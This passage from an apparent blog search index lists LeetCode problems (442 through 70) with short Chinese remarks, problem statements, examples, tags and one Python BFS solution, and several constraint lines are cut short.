= adceb, p = *a*bOutput: trueExplanation: The first '*' matches the empty sequence, while the second '*' matches the substring dce.Example 5:Input: s = acdcb, p = a*c?bOutput: false Constraints:0 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Recursion","Dynamic Programming","String","Greedy"]},{"title":"leetcode-442 - Find All Duplicates in an Array","url":"/2021/07/leetcode-442/","content":"動機\n又一個有趣的手法\n\nProblem\nGiven an integer array nums of length n where all the integers of nums are in the range [1, n] and each integer appears once or twice, return an array of all the integers that appears twice.You must write an algorithm that runs in O(n) time and uses only constant extra space. Example 1:Input: nums = [4,3,2,7,8,2,3,1]Output: [2,3]Example 2:Input: nums = [1,1,2]Output: [1]Example 3:Input: nums = [1]Output: [] Constraints:n == nums.length1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Array","Hash Table"]},{"title":"leetcode-443 - String Compression","url":"/2021/07/leetcode-443/","content":"動機\n就統計阿\n\nProblem\nGiven an array of characters chars, compress it using the following algorithm:Begin with an empty string s. For each group of consecutive repeating characters in chars:If the group's length is 1, append the character to s.Otherwise, append the character followed by the group's length.The compressed string s should not be returned separately, but instead be stored in the input character array chars. Note that group lengths that are 10 or longer will be split into multiple characters in chars.After you are done modifying the input array, return the new length of the array.You must write an algorithm that uses only constant extra space. Example 1:Input: chars = [a,a,b,b,c,c,c]Output: Return 6, and the first 6 characters of the input array should be: [a,2,b,2,c,3]Explanation: The groups are aa, bb, and ccc. This compresses to a2b2c3.Example 2:Input: chars = [a]Output: Return 1, and the first character of the input array should be: [a]Explanation: The only group is a, which remains uncompressed since it's a single character.Example 3:Input: chars = [a,b,b,b,b,b,b,b,b,b,b,b,b]Output: Return 4, and the first 4 characters of the input array should be: [a,b,1,2].Explanation: The groups are a and bbbbbbbbbbbb. This compresses to ab12.Example 4:Input: chars = [a,a,a,b,b,a,a]Output: Return 6, and the first 6 characters of the input array should be: [a,3,b,2,a,2].Explanation: The groups are aaa, bb, and aa. This compresses to a3b2a2. Note that each group is independent even if two groups have the same character. Constraints:1 ","categories":["Algorithm","Leetcode","CTCI-COMPLETE-LIST"],"tags":["String","Two Pointers"]},{"title":"leetcode-445 - Add Two Numbers II","url":"/2021/07/leetcode-445/","content":"動機\nlinked list是不是與長度,reverse很有緣\n\nProblem\nYou are given two non-empty linked lists representing two non-negative integers. The most significant digit comes first and each of their nodes contains a single digit. Add the two numbers and return the sum as a linked list.You may assume the two numbers do not contain any leading zero, except the number 0 itself. Example 1:Input: l1 = [7,2,4,3], l2 = [5,6,4]Output: [7,8,0,7]Example 2:Input: l1 = [2,4,3], l2 = [5,6,4]Output: [8,0,7]Example 3:Input: l1 = [0], l2 = [0]Output: [0] Constraints:The number of nodes in each linked list is in the range [1, 100].0 ","categories":["Algorithm","Leetcode","CTCI-COMPLETE-LIST"],"tags":["Stack","Math","Linked List"]},{"title":"leetcode-452 - Minimum Number of Arrows to Burst Balloons","url":"/2021/07/leetcode-452/","content":"動機\n題目給的是氣球的寬度\n\nProblem\nThere are some spherical balloons spread in two-dimensional space. For each balloon, provided input is the start and end coordinates of the horizontal diameter. Since it's horizontal, y-coordinates don't matter, and hence the x-coordinates of start and end of the diameter suffice. The start is always smaller than the end.An arrow can be shot up exactly vertically from different points along the x-axis. A balloon with xstart and xend bursts by an arrow shot at x if xstart ≤ x ≤ xend. There is no limit to the number of arrows that can be shot. An arrow once shot keeps traveling up infinitely.Given an array points where points[i] = [xstart, xend], return the minimum number of arrows that must be shot to burst all balloons. Example 1:Input: points = [[10,16],[2,8],[1,6],[7,12]]Output: 2Explanation: One way is to shoot one arrow for example at x = 6 (bursting the balloons [2,8] and [1,6]) and another arrow at x = 11 (bursting the other two balloons).Example 2:Input: points = [[1,2],[3,4],[5,6],[7,8]]Output: 4Example 3:Input: points = [[1,2],[2,3],[3,4],[4,5]]Output: 2 Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Array","Greedy","Sorting"]},{"title":"leetcode-456 - 132 Pattern","url":"/2021/07/leetcode-456/","content":"動機\n久違的leetcode\n\nProblem\nGiven an array of n integers nums, a 132 pattern is a subsequence of three integers nums[i], nums[j] and nums[k] such that i < j < k and nums[i] < nums[k] < nums[j].Return true if there is a 132 pattern in nums, otherwise, return false. Example 1:Input: nums = [1,2,3,4]Output: falseExplanation: There is no 132 pattern in the sequence.Example 2:Input: nums = [3,1,4,2]Output: trueExplanation: There is a 132 pattern in the sequence: [1, 4, 2].Example 3:Input: nums = [-1,3,2,0]Output: trueExplanation: There are three 132 patterns in the sequence: [-1, 3, 2], [-1, 3, 0] and [-1, 2, 0]. Constraints:n == nums.length1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Stack","Binary Search","Ordered Set","Monotonic Stack","Python"]},{"title":"leetcode-46 - Permutations","url":"/2021/07/leetcode-46/","content":"動機\n經典排序列舉\n\nProblem\nGiven an array nums of distinct integers, return all the possible permutations. You can return the answer in any order. Example 1:Input: nums = [1,2,3]Output: [[1,2,3],[1,3,2],[2,1,3],[2,3,1],[3,1,2],[3,2,1]]Example 2:Input: nums = [0,1]Output: [[0,1],[1,0]]Example 3:Input: nums = [1]Output: [[1]] Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","Top Interview Questions","seanprashad","CTCI-COMPLETE-LIST"],"tags":["Array","Backtracking"]},{"title":"leetcode-47 - Permutations II","url":"/2021/07/leetcode-47/","content":"動機\n46的follow-up\n\nProblem\nGiven a collection of numbers, nums, that might contain duplicates, return all possible unique permutations in any order. Example 1:Input: nums = [1,1,2]Output:[[1,1,2], [1,2,1], [2,1,1]]Example 2:Input: nums = [1,2,3]Output: [[1,2,3],[1,3,2],[2,1,3],[2,3,1],[3,1,2],[3,2,1]] Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad","CTCI-COMPLETE-LIST"],"tags":["Array","Backtracking"]},{"title":"leetcode-470 - Implement Rand10() Using Rand7()","url":"/2021/07/leetcode-470/","content":"動機\n這三小\n\nProblem\nGiven the API rand7() that generates a uniform random integer in the range [1, 7], write a function rand10() that generates a uniform random integer in the range [1, 10]. You can only call the API rand7(), and you shouldn't call any other API. Please do not use a language's built-in random API.Each test case will have one internal argument n, the number of times that your implemented function rand10() will be called while testing. Note that this is not an argument passed to rand10().Follow up:What is the expected value for the number of calls to rand7() function?Could you minimize the number of calls to rand7()? Example 1:Input: n = 1Output: [2]Example 2:Input: n = 2Output: [2,8]Example 3:Input: n = 3Output: [3,8,10] Constraints:1 ","categories":["Algorithm","Leetcode","CTCI-COMPLETE-LIST"],"tags":["Math","Randomized","Probability and Statistics","Rejection Sampling"]},{"title":"leetcode-472 - Concatenated Words","url":"/2021/07/leetcode-472/","content":"動機\n與140很像\n\nProblem\nGiven an array of strings words (without duplicates), return all the concatenated words in the given list of words.A concatenated word is defined as a string that is comprised entirely of at least two shorter words in the given array. Example 1:Input: words = [cat,cats,catsdogcats,dog,dogcatsdog,hippopotamuses,rat,ratcatdogcat]Output: [catsdogcats,dogcatsdog,ratcatdogcat]Explanation: catsdogcats can be concatenated by cats, dog and cats; dogcatsdog can be concatenated by dog, cats and dog; ratcatdogcat can be concatenated by rat, cat, dog and cat.Example 2:Input: words = [cat,dog,catdog]Output: [catdog] Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad","CTCI-COMPLETE-LIST"],"tags":["Dynamic Programming","String","Depth-First Search","Trie"]},{"title":"leetcode-48 - Rotate Image","url":"/2021/07/leetcode-48/","content":"動機\n很有因緣的一題\n當初自己有解出來，不過那個index的方式十分可怕，加上自己本來就不喜歡index的題目(很多時候都是考細不細心而已，想法很簡單，但是實作細節很多)\n所以解完就放著了\n結果某次offsite就遇到了，同時OJ的網站還十分爛，用stdout當作解答輸出!?\n都什麼年代了!?\ndebug的輸出與解答的輸出混在一起，十分痛苦\n同時那個OJ還要裝browser plugin，來錄音與錄影!!??\n還讓我的mac一直叫!!\n因此超不喜歡這種題目，讓人感覺回到高中或是大一\n得不到演算法設計有關的啟發，就是比細心的題目\n但就是有人offsite會放這種題目…\n所以就重新解一次吧，把當時的錯愕了結於此\n同時對於所有rotate的題目都用reverse去做就好，不然很痛苦\n\nProblem\nYou are given an n x n 2D matrix representing an image, rotate the image by 90 degrees (clockwise).You have to rotate the image in-place, which means you have to modify the input 2D matrix directly. DO NOT allocate another 2D matrix and do the rotation. Example 1:Input: matrix = [[1,2,3],[4,5,6],[7,8,9]]Output: [[7,4,1],[8,5,2],[9,6,3]]Example 2:Input: matrix = [[5,1,9,11],[2,4,8,10],[13,3,6,7],[15,14,12,16]]Output: [[15,13,2,5],[14,3,4,1],[12,6,8,9],[16,7,10,11]]Example 3:Input: matrix = [[1]]Output: [[1]]Example 4:Input: matrix = [[1,2],[3,4]]Output: [[3,1],[4,2]] Constraints:matrix.length == nmatrix[i].length == n1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","CTCI-COMPLETE-LIST","Blind Curated 75"],"tags":["Array","Matrix","Math"]},{"title":"leetcode-494 - Target Sum","url":"/2021/07/leetcode-494/","content":"動機\n當你對遞迴有懷疑就上cache\n\nProblem\nYou are given an integer array nums and an integer target.You want to build an expression out of nums by adding one of the symbols '+' and '-' before each integer in nums and then concatenate all the integers.For example, if nums = [2, 1], you can add a '+' before 2 and a '-' before 1 and concatenate them to build the expression +2-1.Return the number of different expressions that you can build, which evaluates to target. Example 1:Input: nums = [1,1,1,1,1], target = 3Output: 5Explanation: There are 5 ways to assign symbols to make the sum of nums be target 3.-1 + 1 + 1 + 1 + 1 = 3+1 - 1 + 1 + 1 + 1 = 3+1 + 1 - 1 + 1 + 1 = 3+1 + 1 + 1 - 1 + 1 = 3+1 + 1 + 1 + 1 - 1 = 3Example 2:Input: nums = [1], target = 1Output: 1 Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","seanprashad"],"tags":["Dynamic Programming","Array","Backtracking"]},{"title":"leetcode-50 - Pow(x, n)","url":"/2021/07/leetcode-50/","content":"動機\n複習快速pow\n\nProblem\nImplement pow(x, n), which calculates x raised to the power n (i.e., xn). Example 1:Input: x = 2.00000, n = 10Output: 1024.00000Example 2:Input: x = 2.10000, n = 3Output: 9.26100Example 3:Input: x = 2.00000, n = -2Output: 0.25000Explanation: 2-2 = 1/22 = 1/4 = 0.25 Constraints:-100.0 ","categories":["Algorithm","Leetcode","60 questions to solve","Top Interview Questions"],"tags":["Recursion","Math"]},{"title":"leetcode-51 - N-Queens","url":"/2021/07/leetcode-51/","content":"動機\n複習backtrack\n\nProblem\nThe n-queens puzzle is the problem of placing n queens on an n x n chessboard such that no two queens attack each other.Given an integer n, return all distinct solutions to the n-queens puzzle. You may return the answer in any order.Each solution contains a distinct board configuration of the n-queens' placement, where 'Q' and '.' both indicate a queen and an empty space, respectively. Example 1:Input: n = 4Output: [[.Q..,...Q,Q...,..Q.],[..Q.,Q...,...Q,.Q..]]Explanation: There exist two distinct solutions to the 4-queens puzzle as shown aboveExample 2:Input: n = 1Output: [[Q]] Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad","CTCI-COMPLETE-LIST"],"tags":["Array","Backtracking"]},{"title":"leetcode-518 - Coin Change 2","url":"/2021/07/leetcode-518/","content":"動機\n複習dp\n\nProblem\nYou are given an integer array coins representing coins of different denominations and an integer amount representing a total amount of money.Return the number of combinations that make up that amount. If that amount of money cannot be made up by any combination of the coins, return 0.You may assume that you have an infinite number of each kind of coin.The answer is guaranteed to fit into a signed 32-bit integer. Example 1:Input: amount = 5, coins = [1,2,5]Output: 4Explanation: there are four ways to make up the amount:5=55=2+2+15=2+1+1+15=1+1+1+1+1Example 2:Input: amount = 3, coins = [2]Output: 0Explanation: the amount of 3 cannot be made up just with coins of 2.Example 3:Input: amount = 10, coins = [10]Output: 1 Constraints:1 ","categories":["Algorithm","Leetcode","CTCI-COMPLETE-LIST"],"tags":["Dynamic Programming","Array"]},{"title":"leetcode-53 - Maximum Subarray","url":"/2021/07/leetcode-53/","content":"動機\n解一解\n\nProblem\nGiven an integer array nums, find the contiguous subarray (containing at least one number) which has the largest sum and return its sum.A subarray is a contiguous part of an array. Example 1:Input: nums = [-2,1,-3,4,-1,2,1,-5,4]Output: 6Explanation: [4,-1,2,1] has the largest sum = 6.Example 2:Input: nums = [1]Output: 1Example 3:Input: nums = [5,4,-1,7,8]Output: 23 Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","Top Interview Questions","seanprashad","CTCI-COMPLETE-LIST","Blind Curated 75"],"tags":["Dynamic Programming","Array","Divide and Conquer"]},{"title":"leetcode-54 - Spiral Matrix","url":"/2021/07/leetcode-54/","content":"動機\n評語同48\n\nProblem\nGiven an m x n matrix, return all elements of the matrix in spiral order. Example 1:Input: matrix = [[1,2,3],[4,5,6],[7,8,9]]Output: [1,2,3,6,9,8,7,4,5]Example 2:Input: matrix = [[1,2,3,4],[5,6,7,8],[9,10,11,12]]Output: [1,2,3,4,8,12,11,10,9,5,6,7] Constraints:m == matrix.lengthn == matrix[i].length1 ","categories":["Algorithm","Leetcode","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Array","Matrix","Simulation"]},{"title":"leetcode-560 - Subarray Sum Equals K","url":"/2021/07/leetcode-560/","content":"動機\n我忘了prefix sum!!\n同時，這題不能用sliding window\n\nProblem\nGiven an array of integers nums and an integer k, return the total number of continuous subarrays whose sum equals to k. Example 1:Input: nums = [1,1,1], k = 2Output: 2Example 2:Input: nums = [1,2,3], k = 3Output: 2 Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve"],"tags":["Array","Prefix Sum","Hash Table"]},{"title":"leetcode-567 - Permutation in String","url":"/2021/07/leetcode-567/","content":"動機\n雖然說是複習sliding window，但學到一個很迷的技巧\n\nProblem\nGiven two strings s1 and s2, return true if s2 contains a permutation of s1, or false otherwise.In other words, return true if one of s1's permutations is the substring of s2. Example 1:Input: s1 = ab, s2 = eidbaoooOutput: trueExplanation: s2 contains one permutation of s1 (ba).Example 2:Input: s1 = ab, s2 = eidboaooOutput: false Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad","CTCI-COMPLETE-LIST"],"tags":["String","Two Pointers","Hash Table","Sliding Window"]},{"title":"leetcode-572 - Subtree of Another Tree","url":"/2021/07/leetcode-572/","content":"動機\n老實地分成兩個dfs\n\nProblem\nGiven the roots of two binary trees root and subRoot, return true if there is a subtree of root with the same structure and node values of subRoot and false otherwise.A subtree of a binary tree tree is a tree that consists of a node in tree and all of this node's descendants. The tree tree could also be considered as a subtree of itself. Example 1:Input: root = [3,4,5,1,2], subRoot = [4,1,2]Output: trueExample 2:Input: root = [3,4,5,1,2,null,null,null,null,0], subRoot = [4,1,2]Output: false Constraints:The number of nodes in the root tree is in the range [1, 2000].The number of nodes in the subRoot tree is in the range [1, 1000].-104 ","categories":["Algorithm","Leetcode","seanprashad","CTCI-COMPLETE-LIST","Blind Curated 75"],"tags":["Depth-First Search","Binary Tree","Tree","Hash Function","String Matching"]},{"title":"leetcode-600 - Non-negative Integers without Consecutive Ones","url":"/2021/07/leetcode-600/","content":"動機\n這題會不會太過分\n\nProblem\nGiven a positive integer n, return the number of the integers in the range [0, n] whose binary representations do not contain consecutive ones. Example 1:Input: n = 5Output: 5Explanation:Here are the non-negative integers ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming"]},{"title":"leetcode-617 - Merge Two Binary Trees","url":"/2021/07/leetcode-617/","content":"動機\n複習dfs與交換參數的妙用\n\nProblem\nYou are given two binary trees root1 and root2.Imagine that when you put one of them to cover the other, some nodes of the two trees are overlapped while the others are not. You need to merge the two trees into a new binary tree. The merge rule is that if two nodes overlap, then sum node values up as the new value of the merged node. Otherwise, the NOT null node will be used as the node of the new tree.Return the merged tree.Note: The merging process must start from the root nodes of both trees. Example 1:Input: root1 = [1,3,2,5], root2 = [2,1,3,null,4,null,7]Output: [3,4,5,5,4,null,7]Example 2:Input: root1 = [1], root2 = [1,2]Output: [2,2] Constraints:The number of nodes in both trees is in the range [0, 2000].-104 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","seanprashad"],"tags":["Breadth-First Search","Depth-First Search","Binary Tree","Tree"]},{"title":"leetcode-62 - Unique Paths","url":"/2021/07/leetcode-62/","content":"動機\n複習dp\n\nProblem\nA robot is located at the top-left corner of a m x n grid (marked 'Start' in the diagram below).The robot can only move either down or right at any point in time. The robot is trying to reach the bottom-right corner of the grid (marked 'Finish' in the diagram below).How many possible unique paths are there? Example 1:Input: m = 3, n = 7Output: 28Example 2:Input: m = 3, n = 2Output: 3Explanation:From the top-left corner, there are a total of 3 ways to reach the bottom-right corner:1. Right -> Down -> Down2. Down -> Down -> Right3. Down -> Right -> DownExample 3:Input: m = 7, n = 3Output: 28Example 4:Input: m = 3, n = 3Output: 6 Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Dynamic Programming","Math","Combinatorics"]},{"title":"leetcode-621 - Task Scheduler","url":"/2021/07/leetcode-621/","content":"動機\n以為要算所有組合數…\n\nProblem\nGiven a characters array tasks, representing the tasks a CPU needs to do, where each letter represents a different task. Tasks could be done in any order. Each task is done in one unit of time. For each unit of time, the CPU could complete either one task or just be idle.However, there is a non-negative integer n that represents the cooldown period between two same tasks (the same letter in the array), that is that there must be at least n units of time between any two same tasks.Return the least number of units of times that the CPU will take to finish all the given tasks. Example 1:Input: tasks = [A,A,A,B,B,B], n = 2Output: 8Explanation: A -> B -> idle -> A -> B -> idle -> A -> BThere is at least 2 units of time between any two same tasks.Example 2:Input: tasks = [A,A,A,B,B,B], n = 0Output: 6Explanation: On this case any permutation of size 6 would work since n = 0.[A,A,A,B,B,B][A,B,A,B,A,B][B,B,B,A,A,A]...And so on.Example 3:Input: tasks = [A,A,A,A,A,A,B,C,D,E,F,G], n = 2Output: 16Explanation: One possible solution isA -> B -> C -> A -> D -> E -> A -> F -> G -> A -> idle -> idle -> A -> idle -> idle -> A Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","seanprashad"],"tags":["Array","Heap (Priority Queue)","Greedy","Hash Table","Sorting","Counting"]},{"title":"leetcode-63 - Unique Paths II","url":"/2021/07/leetcode-63/","content":"動機\nAlgorithm, Leetcode-62多了石頭\n\nProblem\nA robot is located at the top-left corner of a m x n grid (marked 'Start' in the diagram below).The robot can only move either down or right at any point in time. The robot is trying to reach the bottom-right corner of the grid (marked 'Finish' in the diagram below).Now consider if some obstacles are added to the grids. How many unique paths would there be?An obstacle and space is marked as 1 and 0 respectively in the grid. Example 1:Input: obstacleGrid = [[0,0,0],[0,1,0],[0,0,0]]Output: 2Explanation: There is one obstacle in the middle of the 3x3 grid above.There are two ways to reach the bottom-right corner:1. Right -> Right -> Down -> Down2. Down -> Down -> Right -> RightExample 2:Input: obstacleGrid = [[0,1],[0,0]]Output: 1 Constraints:m == obstacleGrid.lengthn == obstacleGrid[i].length1 ","categories":["Algorithm","Leetcode","60 questions to solve","CTCI-COMPLETE-LIST"],"tags":["Dynamic Programming","Array","Matrix"]},{"title":"leetcode-637 - Average of Levels in Binary Tree","url":"/2021/07/leetcode-637/","content":"動機\n複習bfs\n\nProblem\nGiven the root of a binary tree, return the average value of the nodes on each level in the form of an array. Answers within 10-5 of the actual answer will be accepted. Example 1:Input: root = [3,9,20,null,15,7]Output: [3.00000,14.50000,11.00000]Explanation: The average value of nodes on level 0 is 3, on level 1 is 14.5, and on level 2 is 11.Hence return [3, 14.5, 11].Example 2:&lt;img alt=“” src=&quot;https://assets.leetcode.com/uploads/2021/03/09/avg2-tree.jpg &quot;style=“width: 292px; height: 302px;” /&gt;Input: root = [3,9,20,15,7]Output: [3.00000,14.50000,11.00000] Constraints:The number of nodes in the tree is in the range [1, 104].-231 &lt;= Node.val &lt;= 231 - 1\nSol\nclass Solution:    def averageOfLevels(self, root: TreeNode) -&gt; List[float]:        q = deque([[root]])        ret = []        while q:            rs = q.popleft()            ret.append(sum([r.val for r in rs])/len(rs))            next_rs = sum([[r.left, r.right] for r in rs],[])            next_rs = [r for r in next_rs if r]            if next_rs:                q.append(next_rs)        return ret","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Breadth-First Search","Depth-First Search","Binary Tree","Tree"]},{"title":"leetcode-64 - Minimum Path Sum","url":"/2021/07/leetcode-64/","content":"動機\n複習dp\n\nProblem\nGiven a m x n grid filled with non-negative numbers, find a path from top left to bottom right, which minimizes the sum of all numbers along its path.Note: You can only move either down or right at any point in time. Example 1:Input: grid = [[1,3,1],[1,5,1],[4,2,1]]Output: 7Explanation: Because the path 1 → 3 → 1 → 1 → 1 minimizes the sum.Example 2:Input: grid = [[1,2,3],[4,5,6]]Output: 12 Constraints:m == grid.lengthn == grid[i].length1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions"],"tags":["Dynamic Programming","Array","Matrix"]},{"title":"leetcode-643 - Maximum Average Subarray I","url":"/2021/07/leetcode-643/","content":"動機\n大概抓到sliding window的模式了\n\nProblem\nYou are given an integer array nums consisting of n elements, and an integer k.Find a contiguous subarray whose length is equal to k that has the maximum average value and return this value. Any answer with a calculation error less than 10-5 will be accepted. Example 1:Input: nums = [1,12,-5,-6,50,3], k = 4Output: 12.75000Explanation: Maximum average is (12 - 5 - 6 + 50) / 4 = 51 / 4 = 12.75Example 2:Input: nums = [5], k = 1Output: 5.00000 Constraints:n == nums.length1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Sliding Window"]},{"title":"leetcode-654 - Maximum Binary Tree","url":"/2021/07/leetcode-654/","content":"動機\n這應該是easy吧\n\nProblem\nYou are given an integer array nums with no duplicates. A maximum binary tree can be built recursively from nums using the following algorithm:Create a root node whose value is the maximum value in nums.Recursively build the left subtree on the subarray prefix to the left of the maximum value.Recursively build the right subtree on the subarray suffix to the right of the maximum value.Return the maximum binary tree built from nums. Example 1:Input: nums = [3,2,1,6,0,5]Output: [6,3,5,null,2,0,null,null,1]Explanation: The recursive calls are as follow:- The largest value in [3,2,1,6,0,5] is 6. Left prefix is [3,2,1] and right suffix is [0,5].    - The largest value in [3,2,1] is 3. Left prefix is [] and right suffix is [2,1].        - Empty array, so no child.        - The largest value in [2,1] is 2. Left prefix is [] and right suffix is [1].            - Empty array, so no child.            - Only one element, so child is a node with value 1.    - The largest value in [0,5] is 5. Left prefix is [0] and right suffix is [].        - Only one element, so child is a node with value 0.        - Empty array, so no child.Example 2:Input: nums = [3,2,1]Output: [3,null,2,null,1] Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Array","Stack","Divide and Conquer","Binary Tree","Tree","Monotonic Stack"]},{"title":"leetcode-66 - Plus One","url":"/2021/07/leetcode-66/","content":"動機\n水題\n\nProblem\nGiven a non-empty array of decimal digits representing a non-negative integer, increment one to the integer.The digits are stored such that the most significant digit is at the head of the list, and each element in the array contains a single digit.You may assume the integer does not contain any leading zero, except the number 0 itself. Example 1:Input: digits = [1,2,3]Output: [1,2,4]Explanation: The array represents the integer 123.Example 2:Input: digits = [4,3,2,1]Output: [4,3,2,2]Explanation: The array represents the integer 4321.Example 3:Input: digits = [0]Output: [1] Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Array","Math"]},{"title":"leetcode-662 - Maximum Width of Binary Tree","url":"/2021/07/leetcode-662/","content":"動機\n忘了可以上index，要算距離就是index!!\n\nProblem\nGiven the root of a binary tree, return the maximum width of the given tree.The maximum width of a tree is the maximum width among all levels.The width of one level is defined as the length between the end-nodes (the leftmost and rightmost non-null nodes), where the null nodes between the end-nodes are also counted into the length calculation.It is guaranteed that the answer will in the range of 32-bit signed integer. Example 1:Input: root = [1,3,2,5,3,null,9]Output: 4Explanation: The maximum width existing in the third level with the length 4 (5,3,null,9).Example 2:Input: root = [1,3,null,5,3]Output: 2Explanation: The maximum width existing in the third level with the length 2 (5,3).Example 3:Input: root = [1,3,2,5]Output: 2Explanation: The maximum width existing in the second level with the length 2 (3,2).Example 4:Input: root = [1,3,2,5,null,null,9,6,null,null,7]Output: 8Explanation: The maximum width existing in the fourth level with the length 8 (6,null,null,null,null,null,null,7). Constraints:The number of nodes in the tree is in the range [1, 3000].-100 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Breadth-First Search","Depth-First Search","Binary Tree","Tree"]},{"title":"leetcode-67 - Add Binary","url":"/2021/07/leetcode-67/","content":"動機\n加加加\n\nProblem\nGiven two binary strings a and b, return their sum as a binary string. Example 1:Input: a = 11, b = 1Output: 100Example 2:Input: a = 1010, b = 1011Output: 10101 Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["String","Math","Bit Manipulation","Simulation"]},{"title":"leetcode-673 - Number of Longest Increasing Subsequence","url":"/2021/07/leetcode-673/","content":"動機\ndp的比較好理解\n\nProblem\nGiven an integer array nums, return the number of longest increasing subsequences.Notice that the sequence has to be strictly increasing. Example 1:Input: nums = [1,3,5,4,7]Output: 2Explanation: The two longest increasing subsequences are [1, 3, 4, 7] and [1, 3, 5, 7].Example 2:Input: nums = [2,2,2,2,2]Output: 5Explanation: The length of longest continuous increasing subsequence is 1, and there are 5 subsequences' length is 1, so output 5. Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Dynamic Programming","Array","Segment Tree","Binary Indexed Tree"]},{"title":"leetcode-677 - Map Sum Pairs","url":"/2021/07/leetcode-677/","content":"動機\n沒看清楚功能要求吃了3個WA\n\nProblem\nDesign a map that allows you to do the following:Maps a string key to a given value.Returns the sum of the values that have a key with a prefix equal to a given string.Implement the MapSum class:MapSum() Initializes the MapSum object.void insert(String key, int val) Inserts the key-val pair into the map. If the key already existed, the original key-value pair will be overridden to the new one.int sum(string prefix) Returns the sum of all the pairs' value whose key starts with the prefix. Example 1:Input[MapSum, insert, sum, insert, sum][[], [apple, 3], [ap], [app, 2], [ap]]Output[null, null, 3, null, 5]ExplanationMapSum mapSum = new MapSum();mapSum.insert(apple, 3);  mapSum.sum(ap);           // return 3 (apple = 3)mapSum.insert(app, 2);    mapSum.sum(ap);           // return 5 (apple + app = 3 + 2 = 5) Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["String","Design","Hash Table","Trie"]},{"title":"leetcode-69 - Sqrt(x)","url":"/2021/07/leetcode-69/","content":"動機\n我忘了lowerbound\n\nProblem\nGiven a non-negative integer x, compute and return the square root of x.Since the return type is an integer, the decimal digits are truncated, and only the integer part of the result is returned.Note: You are not allowed to use any built-in exponent function or operator, such as pow(x, 0.5) or x ** 0.5. Example 1:Input: x = 4Output: 2Example 2:Input: x = 8Output: 2Explanation: The square root of 8 is 2.82842..., and since the decimal part is truncated, 2 is returned. Constraints:0 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Math","Binary Search"]},{"title":"leetcode-695 - Max Area of Island","url":"/2021/07/leetcode-695/","content":"動機\n以為是要數幾座島，結果是要數島的面積\n\nProblem\nYou are given an m x n binary matrix grid. An island is a group of 1's (representing land) connected 4-directionally (horizontal or vertical.) You may assume all four edges of the grid are surrounded by water.The area of an island is the number of cells with a value 1 in the island.Return the maximum area of an island in grid. If there is no island, return 0. Example 1:Input: grid = [[0,0,1,0,0,0,0,1,0,0,0,0,0],[0,0,0,0,0,0,0,1,1,1,0,0,0],[0,1,1,0,1,0,0,0,0,0,0,0,0],[0,1,0,0,1,1,0,0,1,0,1,0,0],[0,1,0,0,1,1,0,0,1,1,1,0,0],[0,0,0,0,0,0,0,0,0,0,1,0,0],[0,0,0,0,0,0,0,1,1,1,0,0,0],[0,0,0,0,0,0,0,1,1,0,0,0,0]]Output: 6Explanation: The answer is not 11, because the island must be connected 4-directionally.Example 2:Input: grid = [[0,0,0,0,0,0,0,0]]Output: 0 Constraints:m == grid.lengthn == grid[i].length1 ","categories":["Algorithm","Leetcode","60 questions to solve"],"tags":["Array","Matrix","Union Find","Breadth-First Search","Depth-First Search"]},{"title":"leetcode-698 - Partition to K Equal Sum Subsets","url":"/2021/07/leetcode-698/","content":"動機\n人生第一次用狀態壓縮\n\nProblem\nGiven an integer array nums and an integer k, return true if it is possible to divide this array into k non-empty subsets whose sums are all equal. Example 1:Input: nums = [4,3,2,3,5,2,1], k = 4Output: trueExplanation: It's possible to divide it into 4 subsets (5), (1, 4), (2,3), (2,3) with equal sums.Example 2:Input: nums = [1,2,3,4], k = 3Output: false Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Dynamic Programming","Array","Bit Manipulation","Backtracking","Memoization","Bitmask"]},{"title":"leetcode-7 - Reverse Integer","url":"/2021/07/leetcode-7/","content":"動機\n要自己處理32位整數的溢位\n\nProblem\nGiven a signed 32-bit integer x, return x with its digits reversed. If reversing x causes the value to go outside the signed 32-bit integer range [-231, 231 - 1], then return 0.Assume the environment does not allow you to store 64-bit integers (signed or unsigned). Example 1:Input: x = 123Output: 321Example 2:Input: x = -123Output: -321Example 3:Input: x = 120Output: 21Example 4:Input: x = 0Output: 0 Constraints:-231 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Math"]},{"title":"leetcode-70 - Climbing Stairs","url":"/2021/07/leetcode-70/","content":"動機\n複習基本DP\n\nProblem\nYou are climbing a staircase. It takes n steps to reach the top.Each time you can either climb 1 or 2 steps. In how many distinct ways can you climb to the top? Example 1:Input: n = 2Output: 2Explanation: There are two ways to climb to the top.1. 1 step + 1 step2. 2 stepsExample 2:Input: n = 3Output: 3Explanation: There are three ways to climb to the top.1. 1 step + 1 step + 1 step2. 1 step + 2 steps3. 2 steps + 1 step Constraints:1 